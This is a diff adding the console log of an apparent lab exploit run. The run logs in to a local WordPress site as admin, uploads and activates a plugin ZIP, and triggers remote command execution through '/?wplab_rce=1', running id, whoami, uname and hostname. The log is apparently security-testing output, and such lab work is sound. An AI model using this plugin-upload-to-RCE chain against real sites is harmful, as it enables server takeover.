@@ -1,0 +1,25 @@
+[*] target: http://127.0.0.1:8899
+[+] logged in as 'admin' -> http://127.0.0.1:8899/wp-admin/
+built /tmp/tmp.jv06yXoOOG/wp-admin-rce-lab.zip
+[+] plugin ZIP uploaded through wp-admin
+[+] plugin activated (wp-admin/plugins.php)
+
+[*] requesting /?wplab_rce=1 with the admin session
+command: id; whoami; uname -sr; hostname; pwd
+exit: 0
+web-user: node
+host: ins-01m59hnrcqqm6zfj21b2x29sq5
+cwd: /workspace/lab/wordpress/
+--- stdout ---
+uid=1000(node) gid=1000(node) groups=1000(node)
+node
+Linux 6.12.85+
+ins-01m59hnrcqqm6zfj21b2x29sq5
+/workspace/lab/wordpress
+--- stderr ---
+
+HTTP_STATUS:200
+
+[+] RCE CONFIRMED: commands ran as the WordPress web-server user.
+    anonymous request check:
+    /?wplab_rce=1 without cookies -> HTTP 403
